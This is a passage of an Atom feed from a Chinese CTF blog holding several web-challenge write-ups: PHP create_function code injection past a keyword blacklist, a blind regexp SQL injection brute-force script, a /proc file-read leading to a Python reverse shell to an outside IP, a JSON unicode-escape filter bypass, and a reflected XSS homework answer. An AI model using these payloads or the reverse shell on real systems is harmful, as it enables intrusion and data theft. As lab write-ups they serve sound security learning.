preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#39;, $arg) ) &#123;     die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#39;t get my flag =w=&quot;); &#125; else &#123;     include &quot;flag.php&quot;;    $code(&#39;&#39;, $arg); &#125; ?&gt;       </code></pre><p>$code和$arg可以通过<code>extract($_GET[&quot;flag&quot;]);</code>传入     </p><p><code>creat_function()</code>函数       </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/163792/4/20511/6856/6082e575Ef04fe2e5/514edbaaa03f01e8.png" alt="01.png">      </p><pre><code>$func=creat_function(&#39;$a,$b&#39;,&#39;return $a*$b;&#39;);func()  就相当于    function func($a,$b)&#123;    return $a*$b;&#125;  </code></pre><p>如果参数可控，我们就可以通过<code>&#125;</code>提前结束函数，执行其他语句</p><pre><code>$func=creat_function(&#39;$a,$b&#39;,&#39;return $a*$b;&#125;eval(system(&#39;ls&#39;));//&#39;);   function func($a,$b)    &#123;        return $a*$b;&#125;        eval(system(&#39;ls&#39;));//&#125;</code></pre><p>flag[code]=create_function<br>%66%6C%61%67%5B%63%6F%64%65%5D=%63%72%65%61%74%65%5F%66%75%6E%63%74%69%6F%6E<br>flag[arg]=;}a();//<br>%66%6C%61%67%5B%61%72%67%5D=    </p><p><code>get_defined_vars()</code>函数会以数组形式返回所有变量和值<br><code>flag[code]=create_function&amp;flag[arg]=;&#125;var_dump(get_defined_vars());//</code><br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/163461/36/20309/34836/6082eb4cE5ed6382e/e08bdbff0aa587d8.png" alt="02.png"><br><code>require</code>读取文件<br><code>flag[arg]=;&#125;require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//</code><br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/183003/35/675/45335/6082ec64E4b186153/4b8afb83d9a49b77.png" alt="03.png"><br>这个是假的<br>要用伪协议，URL取反    </p><p><code>;&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//</code><br><img src="https://img12.360buyimg.com/ddimg/jfs/t1/173695/38/6129/110660/6082ef53Eed0617a1/19b0d876457d7346.png" alt="04.png">       </p><p><a href="https://www.gem-love.com/ctf/770.html">MORE</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;-*-&quot;&gt;&lt;/a&gt;-*-&lt;/h2&gt;&lt;p&gt;代码审计    &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;```php
 &amp;lt;?php
highlight_file(__FILE__);
error</summary>
      
    
    
    
    
    <category term="wp" scheme="http://lll-nnn.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>SQLi</title>
    <link href="http://lll-nnn.github.io/2021/04/22/BUU73/"/>
    <id>http://lll-nnn.github.io/2021/04/22/BUU73/</id>
    <published>2021-04-22T11:10:33.000Z</published>
    <updated>2021-04-22T11:47:16.402Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=".`."></a>.`.</h2><p><img src="https://s.pc.qq.com/tousu/img/20210422/8769310_1619090005.jpg" alt="01.png">      </p><p><code>robots.txt</code>     </p><pre><code>User-agent: *Disallow: /hint.txt      </code></pre><p><code>hint.txt</code>      </p><pre><code>$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#39;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;If $_POST[&#39;passwd&#39;] === admin&#39;s password,Then you will get the flag;     </code></pre><p>regexp正则注入<br><code>regexp</code>函数，匹配字符      </p><p><img src="https://s.pc.qq.com/tousu/img/20210422/1627861_1619091624.jpg" alt="02.png">         </p><p>单引号被过        </p><p>用<code>\</code>转义username的单引号，passwd后接<code>||</code>(或)         </p><p>payload:<code>username=\&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code>     </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parsepasswd = <span class="hljs-string">&#x27;&#x27;</span>string= string.ascii_lowercase + string.digits + <span class="hljs-string">&#x27;_&#x27;</span>    <span class="hljs-comment">#小写字母加数字加_</span>url = <span class="hljs-string">&#x27;http://83eb23d8-2065-4521-9970-018a0b4ce880.node3.buuoj.cn/index.php&#x27;</span><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> string:        data = &#123;            <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,            <span class="hljs-string">&quot;passwd&quot;</span>:<span class="hljs-string">&quot;||/**/passwd/**/regexp/**/\&quot;^&#123;&#125;\&quot;;&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>((passwd+m),parse.unquote(<span class="hljs-string">&#x27;%00&#x27;</span>))       <span class="hljs-comment">##parse.unquote进行url解码，不解码直接弄不行</span>        &#125;        res = requests.post(url,data=data)        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;welcome&#x27;</span> <span class="hljs-keyword">in</span> res.text:            passwd += m            print(m)            <span class="hljs-keyword">break</span>    <span class="hljs-keyword">if</span> m==<span class="hljs-string">&#x27;_&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;welcome&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.text:        <span class="hljs-keyword">break</span>print(passwd)</code></pre></code></pre><p><img src="https://s.pc.qq.com/tousu/img/20210422/1945636_1619091932.jpg" alt="03.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;.`.&quot;&gt;&lt;/a&gt;.`.&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://s.pc.qq.com/tousu/img/20210422/8769310_1619090005.jpg&quot;</summary>
      
    
    
    
    
    <category term="wp" scheme="http://lll-nnn.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>PicDown</title>
    <link href="http://lll-nnn.github.io/2021/04/18/BUU72/"/>
    <id>http://lll-nnn.github.io/2021/04/18/BUU72/</id>
    <published>2021-04-18T14:25:48.000Z</published>
    <updated>2021-04-18T15:02:28.076Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PicDown"><a href="#PicDown" class="headerlink" title="PicDown"></a>PicDown</h2><p><img src="https://ae03.alicdn.com/kf/Uce6df5309dde4da49889e468a001b3c4b.jpg" alt="01.png">      </p><p>随便输，url变成了<code>http://7a97406b-5c95-46e4-be43-8311778ca05e.node3.buuoj.cn/?url=127.0.0.1</code><br>看到url，以为是ssrf,试了几下，感觉不是，看了wp       </p><p>是任意文件读取，甚至不需要目录穿越<img src="https://ae04.alicdn.com/kf/U6f624042f7c74f188c65470ebb0687d0j.jpg" alt="02.png">        </p><p>直接读<code>/flag</code>可以读出来         </p><p><code>/proc目录</code>      </p><p>Linux上的<code>/proc目录</code>是一种虚拟文件系统，存储的是当前内核运行状态的一系列文件，也就是进程的信息<br>每个进程都有一个ID         </p><p><img src="https://ae02.alicdn.com/kf/U555898227cde48a2b6d2420930eef73f4.jpg" alt="03.png">       </p><p>我们看一下1进程下       </p><p><img src="https://ae03.alicdn.com/kf/U2af9107ac917499d97778f87a30fbcbdM.jpg" alt="04.png">         </p><p><code>/cmdline</code>文件存储着启动当前进程的完整命令<br><img src="https://ae03.alicdn.com/kf/Uf71910986c3d4a0ebe9e98d3d0a57d12z.jpg" alt="05.png">      </p><p><code>/proc/self 表示当前进程目录</code>    </p><p>回到题上，看一下当前进程的命令<code>url=/proc/self/cmdline</code><br><img src="https://ae03.alicdn.com/kf/U96555e477ec64b21977950e508bfc592L.jpg" alt="06.png">       </p><p>读一下<code>app.py</code>       </p><pre><code><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> urllibapp = Flask(__name__)SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span>f = <span class="hljs-built_in">open</span>(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)<span class="hljs-meta">@app.route(&#x27;/&#x27;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>)<span class="hljs-meta">@app.route(&#x27;/page&#x27;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">page</span>():</span>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url.lower().startswith(<span class="hljs-string">&quot;file&quot;</span>):            res = urllib.urlopen(url)            value = res.read()            response = Response(value, mimetype=<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>)            response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=beautiful.jpg&#x27;</span>            <span class="hljs-keyword">return</span> response        <span class="hljs-keyword">else</span>:            value = <span class="hljs-string">&quot;HACK ERROR!&quot;</span>    <span class="hljs-keyword">except</span>:        value = <span class="hljs-string">&quot;SOMETHING WRONG!&quot;</span>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>, res=value)<span class="hljs-meta">@app.route(&#x27;/no_one_know_the_manager&#x27;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">manager</span>():</span>    key = request.args.get(<span class="hljs-string">&quot;key&quot;</span>)    print(SECRET_KEY)    <span class="hljs-keyword">if</span> key == SECRET_KEY:        shell = request.args.get(<span class="hljs-string">&quot;shell&quot;</span>)        os.system(shell)        res = <span class="hljs-string">&quot;ok&quot;</span>    <span class="hljs-keyword">else</span>:        res = <span class="hljs-string">&quot;Wrong Key!&quot;</span>    <span class="hljs-keyword">return</span> res<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)</code></pre></code></pre><p>在<code>/no_one_know_the_manager</code>路由下<br>get到的key==SECRET_KEY就能执行命令了         </p><p>得到SECRET_KEY       </p><p><code>/proc/self/fd</code><br>fd这个目录里面包含这当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容。       </p><p><strong>如果一个程序用<code>open()</code>打开了一个文件但最终没有关闭他，即便从外部（如<code>os.remove(SECRET_FILE)</code>）删除这个文件之后，在 <code>/proc</code> 这个进程的 <code>pid</code> 目录下的 <code>fd</code> 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong>          </p><p>所以读取<code>/proc/self/fd/1</code><br>对1爆破，当为3时，长度不一样<br><img src="https://ae02.alicdn.com/kf/Ub2f3a30c5fcd4cc69104781da2a8dc3ey.jpg" alt="07.png">        </p><p>需要将SECRET_KEY url编码一下<br><img src="https://ae02.alicdn.com/kf/U77030cdb74d544d190193eb79ca4157aN.jpg" alt="08.png">       </p><p>因为system没有回显，所以需要反弹shell       </p><pre><code>python -c &quot;importos,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;172.16.154.239&#39;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;]);&quot;       </code></pre><p>python反弹shell，同样url编码       </p><p><a href="https://blog.csdn.net/qq_45521281/article/details/114594402?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&spm=1001.2101.3001.4242">MORE</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PicDown&quot;&gt;&lt;a href=&quot;#PicDown&quot; class=&quot;headerlink&quot; title=&quot;PicDown&quot;&gt;&lt;/a&gt;PicDown&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://ae03.alicdn.com/kf/Uce6df5309dde</summary>
      
    
    
    
    
    <category term="wp" scheme="http://lll-nnn.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Encode_and_encode</title>
    <link href="http://lll-nnn.github.io/2021/04/16/BUU71/"/>
    <id>http://lll-nnn.github.io/2021/04/16/BUU71/</id>
    <published>2021-04-16T14:29:34.000Z</published>
    <updated>2021-04-16T14:46:16.828Z</updated>
    
    <content type="html"><![CDATA[<h2 id="c—-a—-i"><a href="#c—-a—-i" class="headerlink" title="c—-a—-i"></a>c—-a—-i</h2><pre><code><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;  show_source(<span class="hljs-keyword">__FILE__</span>);  <span class="hljs-keyword">exit</span>();&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params">$str</span>) </span>&#123;  $banword = [    <span class="hljs-comment">// no path traversal</span>    <span class="hljs-string">&#x27;\.\.&#x27;</span>,    <span class="hljs-comment">// no stream wrapper</span>    <span class="hljs-string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,    <span class="hljs-comment">// no data exfiltration</span>    <span class="hljs-string">&#x27;flag&#x27;</span>  ];  $regexp = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $banword) . <span class="hljs-string">&#x27;/i&#x27;</span>;  <span class="hljs-keyword">if</span> (preg_match($regexp, $str)) &#123;    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;$body = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);$json = json_decode($body, <span class="hljs-literal">true</span>);<span class="hljs-keyword">if</span> (is_valid($body) &amp;&amp; <span class="hljs-keyword">isset</span>($json) &amp;&amp; <span class="hljs-keyword">isset</span>($json[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;  $page = $json[<span class="hljs-string">&#x27;page&#x27;</span>];  $content = file_get_contents($page);  <span class="hljs-keyword">if</span> (!$content || !is_valid($content)) &#123;    $content = <span class="hljs-string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;  &#125;&#125; <span class="hljs-keyword">else</span> &#123;  $content = <span class="hljs-string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;&#125;<span class="hljs-comment">// no data exfiltration!!!</span>$content = preg_replace(<span class="hljs-string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="hljs-string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, $content);<span class="hljs-keyword">echo</span> json_encode([<span class="hljs-string">&#x27;content&#x27;</span> =&gt; $content]);</code></pre></code></pre><p>以json的格式post数据，读取flag文件        </p><p>json中可以用utf-16编码       </p><p>php—-&gt;<code>\u0070\u0068\u0070</code><br>flag—–&gt;<code>\u0066\u006C\u0061\u0067</code>       </p><p>伪协议读取即可        </p><p>payload：<code>&#123; &quot;page&quot; : &quot;\u0070\u0068\u0070://filter/read=convert.Base64-encode/resource=/\u0066\u006c\u0061\u0067&quot;&#125;</code></p><p><img src="https://ae04.alicdn.com/kf/Uc0dae37fec114059ba662aef6c3440a4s.jpg" alt="01.png"></p><hr><hr><p><img src="https://ae03.alicdn.com/kf/U077aee7bf14d4989834bd3d5c060ab95X.jpg" alt="我是伞兵">    </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;c—-a—-i&quot;&gt;&lt;a href=&quot;#c—-a—-i&quot; class=&quot;headerlink&quot; title=&quot;c—-a—-i&quot;&gt;&lt;/a&gt;c—-a—-i&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;&lt;pre&gt;&lt;code class=&quot;hljs php&quot;&gt; &lt;span class=&quot;</summary>
      
    
    
    
    
    <category term="wp" scheme="http://lll-nnn.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Nep1</title>
    <link href="http://lll-nnn.github.io/2021/04/16/nep1/"/>
    <id>http://lll-nnn.github.io/2021/04/16/nep1/</id>
    <published>2021-04-16T10:03:05.000Z</published>
    <updated>2021-04-18T12:00:42.142Z</updated>
    
    <content type="html"><![CDATA[<h2 id="—-—"><a href="#—-—" class="headerlink" title="—__—"></a>—__—</h2><p>1.本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？（5分）      </p><pre><code>Burp Proxy-----拦截HTPP(s)请求，抓包，修改请求，发包......        Firefox-----好用的开发人员工具......</code></pre><p>2.本视频中体现了哪些攻防上的哲学观点？作者希望你养成什么样的思维？这些思维在帮助你挖掘漏洞的时候有什么帮助？结合你的经历与视频内容谈谈你的看法。（10分）</p><pre><code>攻要找一点，防要找全部      对应用程序的每个按钮都看看，并思考程序可能被攻击的方式</code></pre><p>3.审计以下代码：</p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[ <span class="hljs-string">&#x27; name &#x27;</span> ]))&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h1&gt;Hello <span class="hljs-subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span> !&lt;/h1&gt;&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span>&lt;form method=<span class="hljs-string">&quot;GET&quot;</span>&gt;Enter your name: &lt;input type=<span class="hljs-string">&quot;input&quot;</span> name=<span class="hljs-string">&quot;name&quot;</span>&gt;&lt;br&gt;&lt;input type=<span class="hljs-string">&quot; submit&quot;</span>&gt;</code></pre></code></pre><p>本段代码涉及到客户端，服务端以及通信协议。<br>运行在客户端的代码主要有HTML以及javascript，由浏览器核心负责解释</p><p>通信协议为HTTP协议，有多种格式的请求包，常见的为POST与GET</p><p>运行在服务端的代码为php，由php核心负责解释。</p><p>用户端与服务端通过HTTP通信协议进行交互。</p><p>那么，以上代码中，哪些部分属于客户端的内容，哪些属于服务端的内容？（1分）</p><pre><code>html部分属于客户端的内容，PHP部分属于服务端的内容</code></pre><p>客户端是通过传递什么参数来控制服务端代码的？（1分）</p><pre><code>name</code></pre><p>客户端通过控制该参数会对服务端造成什么影响，继而使得客户端本身收到影响，从而造成了什么漏洞？如果是xss漏洞，具体又是什么类型的xss漏洞，为什么？（3分）</p><pre><code>反射型xss提交name=&lt;script&gt;alert(1)&lt;/script&gt;后查看页面源代码，发现插入了&lt;script&gt;标签并被网页解析       </code></pre><p><img src="https://ae04.alicdn.com/kf/U20e43d350dcd492c8cd41f983b285f5dw.jpg" alt="01.png"></p><p>4.思考：现实中如何利用xss漏洞实施攻击，我们应该如何预防？（1分）</p><pre><code>在网站中插入XSS获得管理员cookie，登录后台管理页面.......       过滤标签，HTTP-only</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;—-—&quot;&gt;&lt;a href=&quot;#—-—&quot; class=&quot;headerlink&quot; title=&quot;—__—&quot;&gt;&lt;/a&gt;—__—&lt;/h2&gt;&lt;p&gt;1.本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？（5分）      &lt;/</summary>
      
    
    
    
    
    <category term="note" scheme="http://lll-nnn.github.io/tags/note/"/>
    
  </entry>
  
</feed>
